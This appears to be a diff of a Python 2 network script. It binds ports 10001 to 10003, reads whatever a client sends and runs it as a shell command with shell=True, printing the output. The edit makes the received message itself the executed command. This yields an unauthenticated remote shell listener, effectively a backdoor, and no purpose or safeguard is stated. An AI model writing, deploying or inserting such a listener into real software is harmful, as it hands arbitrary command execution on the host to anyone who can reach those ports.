@@ -21,11 +21,11 @@ for port in [10001,10002,10003]:
         while True:
             client, (clienthost, clientport) = stream_sock.accept()
             print "\n\n************** Request at ",port
-            msg = "SERVER Says: " + client.recv(65536)
+            msg = client.recv(65536)
 
             print msg
             
-            proc=subprocess.Popen(client.recv(65536), shell=True, stdout=subprocess.PIPE,)
+            proc=subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE,)
             output=proc.communicate()[0]
             print output
             
